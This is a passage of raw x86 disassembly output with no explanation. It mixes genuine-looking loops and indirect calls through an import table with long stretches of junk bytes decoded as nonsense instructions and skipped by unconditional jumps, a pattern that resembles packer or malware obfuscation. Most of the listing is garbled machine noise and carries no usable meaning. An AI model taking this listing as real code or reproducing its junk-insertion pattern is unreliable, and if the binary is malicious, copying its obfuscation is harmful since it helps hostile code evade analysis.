  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x44]
  40b0b6:	xchg   edx,eax
  40b0b7:	call   0xb67e:0x7e3fc9e1
  40b0be:	jle    0x40b13e
  40b0c0:	jle    0x40b05f
  40b0c2:	pusha  
  40b0c3:	adc    edx,DWORD PTR [ecx]
  40b0c5:	pop    ds
  40b0c6:	(bad)  
  40b0c7:	and    esp,DWORD PTR [ebx+0x51]
  40b0ca:	add    DWORD PTR [ecx+0x5e7faeca],ebp
  40b0d0:	or     DWORD PTR [ecx+0x37],ecx
  40b0d3:	lahf   
  40b0d4:	call   0x5630fe5e
  40b0d9:	pusha  
  40b0da:	cmp    al,0xb4
  40b0dc:	shl    BYTE PTR [eax+0x72],0x36
  40b0e0:	jne    0x40b074
  40b0e2:	lock push 0xffffffb8
  40b0e5:	inc    eax
  40b0e6:	out    0x39,eax
  40b0e8:	out    dx,al
  40b0e9:	and    DWORD PTR [ecx],ebp
  40b0eb:	mov    ds:0xfb7fd8b2,eax
  40b0f0:	or     DWORD PTR [eax-0x3e7fe742],ebp
  40b0f6:	jle    0x40b07d
  40b0f8:	daa    
  40b0f9:	jge    0x40b0c4
  40b0fb:	pop    esi
  40b0fc:	shl    DWORD PTR [eax-0x1a0e56b],0xed
  40b103:	jo     0x40b08a
  40b105:	js     0x40b0d8
  40b107:	inc    esi
  40b108:	jle    0x40b15d
  40b10a:	lock mov ecx,DWORD PTR [ebx-0x47]
  40b10e:	shr    BYTE PTR [eax+0x67280fa3],1
  40b114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b115:	test   eax,0xeb5885e
  40b11a:	(bad)  
  40b11b:	and    bl,BYTE PTR [edx-0x6a]
  40b11e:	call   0xabf5:0xce2e40b
  40b125:	cdq    
  40b126:	je     0x40b143
  40b128:	imul   esi,DWORD PTR [edi+ebp*8-0x6a],0x89209e19
  40b130:	sbb    BYTE PTR [edx],ah
  40b132:	cmp    DWORD PTR [esi],ebp
  40b134:	pop    ss
  40b135:	mov    ch,0xee
  40b137:	aad    0x7b
  40b139:	or     BYTE PTR [bp+0x23b2],al
  40b13e:	jo     0x40b19a
  40b140:	frstor [ebx+edi*4-0x173c08ae]
  40b147:	in     al,0xe7
  40b149:	rcl    BYTE PTR [edi+edi*2+0x73],0xc2
  40b14e:	push   ebp
  40b14f:	pop    eax
  40b150:	mov    edx,DWORD PTR [ebx]
  40b152:	ins    DWORD PTR es:[edi],dx
  40b153:	push   edi
  40b154:	lds    edi,FWORD PTR [ebx]
  40b156:	and    edi,DWORD PTR [edi+0x2d76ee91]
  40b15c:	fistp  DWORD PTR [ebp+0xa]
  40b160:	loop   0x40b1b2
  40b162:	bt     DWORD PTR [ebx],ebp
  40b165:	lods   al,BYTE PTR ds:[esi]
  40b166:	mov    eax,ds:0xa13814f5
  40b16b:	mov    BYTE PTR [ebx-0x7673acfa],al
  40b171:	push   ds
  40b172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b173:	or     BYTE PTR [ecx],bh
  40b175:	jo     0x40b10f
  40b177:	jle    0x40b181
  40b179:	not    BYTE PTR [eax-0x42b8888d]
  40b17f:	cmp    BYTE PTR [ebx+0x38],bh
  40b182:	add    eax,DWORD PTR [edx]
  40b184:	test   al,0x7c
  40b186:	dec    edi
  40b187:	loopne 0x40b1b5
  40b189:	mov    DWORD PTR [ebp-0x8],esi
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x57
  40b1ab:	xor    BYTE PTR [edi+esi*1+0x7e7e3c01],al
  40b1b2:	mov    dh,0x7e
  40b1b4:	jle    0x40b234
  40b1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1b7:	test   BYTE PTR [esi+0x3c16d090],dl
  40b1bd:	sub    ah,BYTE PTR [edx+eiz*4]
  40b1c0:	sbb    al,0x10
  40b1c2:	xor    DWORD PTR [ecx+0x1e],edi
  40b1c5:	jo     0x40b237
  40b1c7:	(bad)  
  40b1c8:	js     0x40b183
  40b1ca:	inc    ebp
  40b1cb:	pop    ds
  40b1cc:	jmp    0x40b246
  40b1ce:	jns    0x40b1d5
  40b1d0:	sbb    ebx,esi
  40b1d2:	jl     0x40b24b
  40b1d4:	(bad)  
  40b1d5:	adc    al,0x1b
  40b1d7:	sar    cl,cl
  40b1d9:	mov    dh,0x63
  40b1db:	ror    BYTE PTR ds:0xfaf82906,1
  40b1e1:	inc    esi
  40b1e2:	sub    eax,0xcb07cc61
  40b1e7:	cmp    BYTE PTR [ebx+0x5c],al
  40b1ea:	cwde   
  40b1eb:	fcmovu st,st(2)
  40b1ed:	push   eax
  40b1ee:	mov    eax,0x25803491
  40b1f3:	sti    
  40b1f4:	rcr    BYTE PTR [ecx-0x36],0xa4
  40b1f8:	and    ah,bh
  40b1fa:	add    ah,bh
  40b1fc:	test   DWORD PTR [esi+0x2500f7c1],esi
  40b202:	sar    DWORD PTR [ebp+0x70],0x23
  40b206:	inc    edi
  40b207:	mov    cl,0x33
  40b209:	int3   
  40b20a:	je     0x40b228
  40b20c:	sbb    bl,BYTE PTR [ebp+0x69]
  40b20f:	mov    ch,0x6b
  40b211:	test   BYTE PTR [ecx+ebp*8+0x253fbac0],al
  40b218:	stos   DWORD PTR es:[edi],eax
  40b219:	mov    esp,0xc67231d5
  40b21e:	int    0xe0
  40b220:	sbb    edi,ebp
  40b222:	push   es
  40b223:	ds jmp 0xe876:0xacf5e145
  40b22b:	hlt    
  40b22c:	mov    ds:0x47b4d401,al
  40b231:	jmp    DWORD PTR [ebx]
  40b233:	jl     0x40b2a5
  40b235:	fldcw  WORD PTR [ebx-0x7600cff5]
  40b23b:	push   0x9df12062
  40b240:	push   esi
  40b241:	fisubr WORD PTR [esi]
  40b243:	sbb    eax,0x244f42be
  40b248:	je     0x40b20c
  40b24a:	pop    edi
  40b24b:	int3   
  40b24c:	pushf  
  40b24d:	adc    BYTE PTR [eax+ecx*4-0x3a06f375],cl
  40b254:	js     0x40b2ad
  40b256:	shl    DWORD PTR [esp+eax*4],0xa1
  40b25a:	je     0x40b269
  40b25c:	call   0xbcf2d5cc
  40b261:	out    dx,al
  40b262:	fisubr WORD PTR [edx-0x76]
  40b265:	enter  0x267c,0x5
  40b269:	and    BYTE PTR [ebp+0x3c],al
  40b26c:	push   edx
  40b26d:	mov    al,0x6c
  40b26f:	jp     0x40b2ec
  40b271:	sub    dl,0x9b
  40b274:	mov    ch,0x8c
  40b276:	add    ch,bh
  40b278:	add    BYTE PTR [edx+0x697b2709],0x8b
  40b27f:	dec    ebp
  40b280:	call   0x513de006
  40b285:	inc    ecx
  40b286:	add    dl,bl
  40b288:	stos   DWORD PTR es:[edi],eax
  40b289:	inc    ecx
  40b28a:	add    BYTE PTR [ebx],dh
  40b28c:	enter  0xff33,0x9
  40b290:	cmp    eax,0x41236c
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4235bf,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4235bf,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx-0x4c19a5cd],edx
  40b2e2:	dec    esi
  40b2e3:	and    al,0x54
  40b2e5:	pop    ecx
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b2ce
  40b2ee:	(bad)  
  40b2ef:	js     0x40b2c7
  40b2f1:	pop    ebp
  40b2f2:	pop    esi
  40b2f3:	in     al,dx
  40b2f4:	jns    0x40b2fe
  40b2f6:	or     eax,0x8f609bdf
  40b2fb:	push   ecx
  40b2fc:	mov    ecx,0x68e2502e
  40b301:	dec    edx
  40b302:	outs   dx,DWORD PTR ds:[esi]
  40b303:	rcr    DWORD PTR [eax-0x55310bab],1
  40b309:	das    
  40b30a:	sar    BYTE PTR [edi],1
  40b30c:	js     0x40b2e7
  40b30e:	in     eax,dx
  40b30f:	lods   al,BYTE PTR ds:[esi]
  40b310:	adc    ebp,0x3695e723
  40b316:	cli    
  40b317:	cld    
  40b318:	jmp    0x4b881817
  40b31d:	push   ecx
  40b31e:	xchg   DWORD PTR ds:0xcf95fd23,edi
  40b324:	popa   
  40b325:	xor    esp,DWORD PTR [si]
  40b328:	dec    ebx
  40b329:	out    dx,eax
  40b32a:	pop    ebp
  40b32b:	stc    
  40b32c:	and    bh,BYTE PTR [esi]
  40b32e:	jp     0x40b351
  40b330:	inc    ebp
  40b331:	mov    edx,0xdf427734
  40b336:	and    al,0x3b
  40b338:	pop    ebp
  40b339:	push   bp
  40b33b:	jnp    0x40b37b
  40b33d:	cmp    dl,BYTE PTR [eax]
  40b33f:	test   BYTE PTR [edi+0x9],dl
  40b342:	sbb    edi,0xffffffd6
  40b345:	hlt    
  40b346:	adc    ebx,esi
  40b348:	xlat   BYTE PTR ds:[ebx]
  40b349:	xchg   ebp,eax
  40b34a:	push   es
  40b34b:	fcomp  DWORD PTR ds:0xbad80c4d
  40b351:	cmp    ah,BYTE PTR [edi-0x7fab9c97]
  40b357:	cwde   
  40b358:	aaa    
  40b359:	add    BYTE PTR [edx],cl
  40b35b:	mov    edi,0x21342c68
  40b360:	lods   al,BYTE PTR ds:[esi]
  40b361:	xchg   ecx,eax
  40b362:	pop    edx
  40b363:	test   DWORD PTR [esi+ebp*2-0x63baf5ec],esi
  40b36a:	push   eax
  40b36b:	mov    edx,0xe4fcfd0b
  40b370:	push   esp
  40b371:	inc    esp
  40b372:	and    eax,0x825b498
  40b377:	into   
  40b378:	adc    BYTE PTR [edi-0x4b],ch
  40b37b:	jbe    0x40b3b9
  40b37d:	jns    0x40b3fa
  40b37f:	(bad)  
  40b380:	dec    BYTE PTR [edx+esi*2-0x559d98d3]
  40b387:	xchg   ebx,eax
  40b388:	test   eax,0x20d8ea77
  40b38d:	pop    ebp
  40b38e:	push   cs
  40b38f:	cmp    edx,DWORD PTR [edx+ecx*8]
  40b392:	sub    BYTE PTR [ebp-0x2d],cl
  40b395:	sub    DWORD PTR [edx],0x2
  40b398:	fst    st(2)
  40b39a:	pop    es
  40b39b:	pushf  
  40b39c:	xor    BYTE PTR [esi+edx*4-0x26],dh
  40b3a0:	rcr    esi,0x9d
  40b3a3:	add    eax,0x52e44dff
  40b3a8:	sbb    al,0xd4
  40b3aa:	pop    ss
  40b3ab:	popa   
  40b3ac:	and    edi,DWORD PTR [edi]
  40b3ae:	dec    edi
  40b3af:	add    edi,DWORD PTR [esi+0x16]
  40b3b2:	test   al,0x26
  40b3b4:	iret   
  40b3b5:	jne    0x40b94a
  40b3bb:	push   DWORD PTR [ebp+0x8]
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4235d3,0x0
  40b45f:	mov    eax,ds:0x4235d3
  40b464:	inc    eax
  40b465:	mov    ds:0x4235d3,eax
  40b46a:	cmp    DWORD PTR ds:0x4235d3,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4235d3,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4235d3
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4235d3,eax
  40b4a0:	cmp    DWORD PTR ds:0x4235d3,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4235c7,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	mov    WORD PTR [eax+0x3d91a4fb],?
  40b53f:	jle    0x40b5bf
  40b541:	mov    dh,0x7e
  40b543:	jle    0x40b5c3
  40b545:	sahf   
  40b546:	sub    edx,DWORD PTR [ebp-0x38]
  40b549:	mov    ebx,0x74895fd6
  40b54e:	test   ah,al
  40b550:	sbb    bl,0x5
  40b553:	ss in  al,0x4c
  40b556:	(bad)  
  40b557:	jmp    0x2ee12c82
  40b55c:	bound  ecx,QWORD PTR [edi-0x74]
  40b55f:	retf   0x5035
  40b562:	cld    
  40b563:	imul   BYTE PTR [edx-0x1223869b]
  40b569:	and    al,0x29
  40b56b:	pushf  
  40b56c:	test   eax,0xa2b04105
  40b571:	lods   eax,DWORD PTR ds:[esi]
  40b572:	sbb    eax,0xcf237230
  40b577:	sahf   
  40b578:	call   DWORD PTR [edi]
  40b57a:	cwde   
  40b57b:	sahf   
  40b57c:	inc    esp
  40b57d:	add    DWORD PTR [eax+ecx*8],ebx
  40b580:	iret   
  40b581:	jne    0x40b5b3
  40b583:	dec    esi
  40b584:	loop   0x40b5ed
  40b586:	mov    ds:0x119d7365,al
  40b58b:	call   0x4178ad0a
  40b590:	int    0x55
  40b592:	leave  
  40b593:	arpl   WORD PTR [esi],bp
  40b595:	clc    
  40b596:	movups XMMWORD PTR [ecx-0x356f16b7],xmm7
  40b59d:	mov    eax,0x7d675cb9
  40b5a2:	maxps  xmm3,XMMWORD PTR [ecx-0x3afbc1]
  40b5a9:	xor    eax,0x545880bc
  40b5ae:	dec    esp
  40b5af:	cmp    DWORD PTR [eax+0x7d17196d],0xffffffd7
  40b5b6:	retf   
  40b5b7:	imul   edx,DWORD PTR [ebp+eiz*4-0x11],0x61497b83
  40b5bf:	jb     0x40b5b0
  40b5c1:	ja     0x40b61c
  40b5c3:	pop    edx
  40b5c4:	mov    bh,0xa0
  40b5c6:	outs   dx,DWORD PTR ds:[esi]
  40b5c7:	sbb    DWORD PTR [eax+0x34],ebx
  40b5ca:	push   esi
  40b5cb:	and    BYTE PTR [ecx],bl
  40b5cd:	inc    edi
  40b5ce:	sub    esp,esi
  40b5d0:	cmp    BYTE PTR [esi-0x31],bh
  40b5d3:	mov    ah,0x9
  40b5d5:	(bad)  
  40b5d6:	out    0x8f,eax
  40b5d8:	cmp    eax,0x8f16547e
  40b5dd:	test   eax,0xe8d27a9a
  40b5e2:	clc    
  40b5e3:	mov    BYTE PTR [esi+0x6a529c48],dl
  40b5e9:	or     al,0x8c
  40b5eb:	cli    
  40b5ec:	xor    al,BYTE PTR [ebp-0x80]
  40b5ef:	adc    DWORD PTR [esi+eax*2+0x5dae9648],ebp
  40b5f6:	dec    esp
  40b5f7:	ja     0x40b641
  40b5f9:	test   al,0x98
  40b5fb:	out    dx,eax
  40b5fc:	aam    0x43
  40b5fe:	cmp    al,BYTE PTR [edi+0x3e]
  40b601:	push   ds
  40b602:	add    eax,0xb2b618c9
  40b607:	xor    eax,0xe11b1872
  40b60c:	xchg   esp,eax
  40b60d:	je     0x40bb55
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0xdf,al
  40b632:	stc    
  40b633:	add    dh,BYTE PTR [ecx-0x17]
  40b636:	xor    bh,BYTE PTR [esi+0x7e]
  40b639:	mov    dh,0x7e
  40b63b:	jle    0x40b6bb
  40b63d:	inc    eax
  40b63e:	pusha  
  40b63f:	mov    ds:0xbe8e0b88,al
  40b644:	pop    eax
  40b645:	mov    ss,ebp
  40b647:	(bad)  
  40b648:	mov    WORD PTR fs:[edx-0x72],ss
  40b64c:	lock (bad) 
  40b64e:	pop    edx
  40b64f:	pusha  
  40b650:	xlat   BYTE PTR ds:[ebx]
  40b651:	(bad)  
  40b653:	sub    dl,BYTE PTR [ebx+0x25]
  40b656:	mov    al,0x6a
  40b658:	sbb    eax,0x26f5d80b
  40b65d:	sub    BYTE PTR [eax-0xab1cf79],dl
  40b663:	enter  0xda79,0x7e
  40b667:	and    DWORD PTR [ebp+ebp*1+0x5102c83],esi
  40b66e:	ins    DWORD PTR es:[edi],dx
  40b66f:	aaa    
  40b670:	mov    esi,0x5e681300
  40b675:	add    dh,BYTE PTR [ecx+edi*2+0x4c]
  40b679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b67a:	pop    ebp
  40b67b:	cmp    bh,BYTE PTR [edi]
  40b67d:	aas    
  40b67e:	dec    ebx
  40b67f:	add    al,0x1b
  40b681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b682:	aaa    
  40b683:	loop   0x40b6d2
  40b685:	arpl   WORD PTR [esi+0x22],ax
  40b688:	lahf   
  40b689:	pop    esi
  40b68a:	(bad)  
  40b68b:	popa   
  40b68c:	or     eax,0xd20c69fe
  40b691:	mov    ebx,0x2858df8d
  40b696:	(bad)  
  40b697:	push   cs
  40b698:	and    BYTE PTR [edx],bh
  40b69a:	retf   0x2ff1
  40b69d:	in     al,0x67
  40b69f:	mov    ebx,0x7a633ca8
  40b6a4:	imul   ebp,ebx,0xffffffc0
  40b6a7:	add    al,0x43
  40b6a9:	aaa    
  40b6aa:	sub    DWORD PTR [di-0xb77],0x2e91bf35
  40b6b3:	cwde   
  40b6b4:	imul   edi,DWORD PTR [esi+0x38],0x28
  40b6b8:	sbb    edi,DWORD PTR fs:[esp+edx*1+0x43]
  40b6bd:	push   ecx
  40b6be:	and    al,0x1a
  40b6c0:	inc    ebx
  40b6c1:	int3   
  40b6c2:	sub    DWORD PTR [edx+eiz*1+0x4b],edi
  40b6c6:	inc    edx
  40b6c7:	int    0x3d
  40b6c9:	fisttp WORD PTR [ebp-0x68]
  40b6cc:	add    al,0x9b
  40b6ce:	jl     0x40b6cf
  40b6d0:	adc    al,0x55
  40b6d2:	push   ecx
  40b6d3:	xchg   edx,eax
  40b6d4:	or     BYTE PTR [eax],bl
  40b6d6:	add    DWORD PTR [ebx-0x8],ecx
  40b6d9:	hlt    
  40b6da:	push   edi
  40b6db:	mov    ebx,0x680a3dc5
  40b6e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6e1:	xchg   esp,eax
  40b6e2:	jae    0x40b6bd
  40b6e4:	dec    esi
  40b6e5:	adc    eax,0xfa3fe562
  40b6ea:	ds xchg ecx,eax
  40b6ec:	mov    esp,esi
  40b6ee:	in     eax,0xf8
  40b6f0:	mov    al,ds:0xec92ff47
  40b6f5:	jle    0x40b68c
  40b6f7:	mov    edx,0x4e96e090
  40b6fc:	stc    
  40b6fd:	jo     0x40b739
  40b6ff:	arpl   WORD PTR [edi-0x46e979c9],di
  40b705:	push   DWORD PTR [ebp+0x8]
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4235cb,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4235c7,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xbf8723e6
  40b867:	and    al,0x59
  40b869:	and    DWORD PTR [ebx],esi
  40b86b:	jle    0x40b8eb
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	or     BYTE PTR [ebp-0x11],dh
  40b874:	(bad)  
  40b875:	fisttp WORD PTR [ebx]
  40b877:	mov    cl,0x8d
  40b879:	inc    eax
  40b87a:	mov    ch,BYTE PTR [ecx-0x27862a00]
  40b880:	mov    esp,0x429580af
  40b885:	mov    bl,0x88
  40b887:	lods   al,BYTE PTR ds:[esi]
  40b888:	pop    ds
  40b889:	pop    esp
  40b88a:	pusha  
  40b88b:	cmp    eax,0x2e8ec3aa
  40b890:	jbe    0x40b84a
  40b892:	lds    edi,FWORD PTR [eax]
  40b894:	call   0x7c2f:0xe2587805
  40b89b:	adc    edi,DWORD PTR fs:[edi-0x3375f47e]
  40b8a2:	dec    eax
  40b8a3:	push   0x32
  40b8a5:	imul   ebp,DWORD PTR [ecx+edx*2-0x3a],0x4e
  40b8aa:	xchg   esp,eax
  40b8ab:	(bad)  
  40b8ac:	adc    esi,DWORD PTR [esi-0x48]
  40b8af:	cdq    
  40b8b0:	pop    ecx
  40b8b1:	stos   DWORD PTR es:[edi],eax
  40b8b2:	xor    ah,BYTE PTR [ebp+edx*8-0x23]
  40b8b6:	cld    
  40b8b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8b8:	adc    al,al
  40b8ba:	mov    dh,0x78
  40b8bc:	and    ecx,edx
  40b8be:	in     eax,dx
  40b8bf:	jge    0x40b93c
  40b8c1:	dec    ebp
  40b8c2:	popa   
  40b8c3:	cs xor ch,0xf5
  40b8c7:	ss cli 
  40b8c9:	jle    0x40b8f6
  40b8cb:	stc    
  40b8cc:	pop    esi
  40b8cd:	pop    esp
  40b8ce:	jb     0x40b8a1
  40b8d0:	pop    ecx
  40b8d1:	inc    ecx
  40b8d2:	jle    0x40b8bb
  40b8d4:	(bad)  
  40b8d5:	push   edi
  40b8d6:	pop    eax
  40b8d7:	leave  
  40b8d8:	mov    al,0xed
  40b8da:	mov    al,ds:0xed629685
  40b8df:	sub    eax,0x9aad555e
  40b8e4:	jg     0x40b92e
  40b8e6:	test   BYTE PTR [esi-0x593459e7],al
  40b8ec:	bound  ecx,QWORD PTR [eax]
  40b8ee:	mov    bh,al
  40b8f0:	pop    edx
  40b8f1:	ror    ah,0xa7
  40b8f4:	adc    ch,BYTE PTR [edx-0x6a]
  40b8f7:	xor    esp,DWORD PTR [eax-0x60]
  40b8fa:	out    dx,al
  40b8fb:	test   al,0xf5
  40b8fd:	call   0xbc31f886
  40b902:	mov    WORD PTR [esi+0x138810c0],?
  40b908:	and    edi,DWORD PTR [edx+0x2a]
  40b90b:	ins    DWORD PTR es:[edi],dx
  40b90c:	fidivr WORD PTR [edx-0x36]
  40b90f:	inc    edx
  40b910:	jp     0x40b91a
  40b912:	cdq    
  40b913:	add    ah,cl
  40b915:	lds    edx,FWORD PTR [ecx+0x67]
  40b918:	imul   ebp,DWORD PTR [esi-0x37],0xb2f6386d
  40b91f:	push   esp
  40b920:	lds    ebp,FWORD PTR [ebx]
  40b922:	and    eax,0x1c2d1da0
  40b927:	fidivr DWORD PTR [esi]
  40b929:	lods   al,BYTE PTR ds:[esi]
  40b92a:	xchg   ebp,eax
  40b92b:	imul   edi,DWORD PTR [eax-0x29],0xffffffa5
  40b92f:	pop    ds
  40b930:	xor    bh,BYTE PTR [ecx+0x3f8cb87b]
  40b936:	mov    esi,0x4d89dbf5
  40b93b:	aam    0x8b
